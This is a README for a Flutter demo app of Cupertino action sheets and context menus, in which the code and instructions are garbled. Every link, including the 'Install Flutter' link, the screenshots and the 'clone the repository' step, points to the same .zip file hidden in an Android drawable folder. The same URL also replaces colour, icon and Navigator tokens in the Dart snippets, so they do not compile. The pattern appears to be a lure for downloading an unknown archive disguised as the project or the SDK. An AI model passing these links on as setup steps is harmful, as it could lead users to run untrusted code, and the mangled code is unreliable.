# Cupertino Action Sheet & Context Menu Flutter App

This Flutter app demonstrates the implementation of Cupertino-style action sheets and context menus. Designed to provide a native iOS look and feel, this app is perfect for developers looking to integrate these elements into their own Flutter projects.

## Features

- *Cupertino Action Sheet*: A modal action sheet with customizable actions.
- *Cupertino Context Menu*: A context menu that appears upon long-pressing an item, offering additional options.

## Screenshots and Video 

<details> 
  <summary><h2>📸Photos</h2></summary>
  <p>
    <table align="center">
  <tr>
    <td><img src="https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip" alt="Image 2" width="180" height="auto"></td>
    <td><img src="https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip" alt="Image 3" width="180" height="auto"></td>
  </tr>
    </table>    
  </p>
  </details>
  <details> 
  <summary><h2>📽️Video</h2></summary>
  <p>
    <table align="center">
  <tr>
    <video src ="https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip"></video> </h1>
  </tr>
    </table>   
  </p>
  </details>


## Getting Started

### Prerequisites

- Flutter SDK: [Install Flutter](https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip)
- Dart SDK: Comes with Flutter installation

### Installation

1. Clone the repository:
    ```bash
    https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip
    ```

2. Install dependencies:
    ```bash
    flutter pub get
    ```

3. Run the app:
    ```bash
    flutter run
    ```

## Usage

## Usage

### Cupertino Action Sheet
The Action sheet is displayed when a button is pressed. Here is a snippet of how it's implemented:

```dart
showCupertinoModalPopup(
                  context: context,
                  builder: (context) => CupertinoActionSheet(
                    title: const Text(
                      'Favorite Mobile',
                      style: TextStyle(
                          color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip, fontSize: 25),
                    ),
                    message: const Column(
                      children: [
                        Center(
                          child: Text(
                            'Please select the best mobile from the\noption below.',
                            style: TextStyle(
                                color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                fontSize: 17),
                          ),
                        ),
                        SizedBox(
                          height: 50,
                          child: Center(
                            child: Text(
                              "OnePlus",
                              style: TextStyle(
                                  color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                  fontSize: 20),
                            ),
                          ),
                        ),
                        SizedBox(
                          height: 50,
                          child: Center(
                            child: Text(
                              "iPhone",
                              style: TextStyle(
                                  color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                  fontSize: 20),
                            ),
                          ),
                        ),
                        SizedBox(
                          height: 50,
                          child: Center(
                            child: Text(
                              "Nokia",
                              style: TextStyle(
                                  color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                  fontSize: 20),
                            ),
                          ),
                        ),
                      ],
                    ),
                    cancelButton: CupertinoActionSheetAction(
                      onPressed: () {
                        https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context).pop();
                      },
                      child: const Text('Cancel'),
                    ),
                  ),
                );
```
### Cupertino Context Menu
The context menu appears upon long-pressing an item. Here is a snippet of how it's implemented:
```dart
CupertinoContextMenu(
            enableHapticFeedback: true,
            actions: <Widget>[
              CupertinoContextMenuAction(
                onPressed: () {
                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                },
                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                child: const Text('Copy'),
              ),
              CupertinoContextMenuAction(
                onPressed: () {
                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                },
                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                child: const Text('Share'),
              ),
              CupertinoContextMenuAction(
                onPressed: () {
                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                },
                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                child: const Text('Favorite'),
              ),
              CupertinoContextMenuAction(
                onPressed: () {
                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                },
                isDestructiveAction: true,
                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                child: const Text('Delete'),
              ),
            ],
            child: SizedBox(
              child: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip("https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip"),
            ),
          );
```
## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any improvements or additions.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

---

Feel free to customize this template to better fit the specifics of your project. Happy coding!
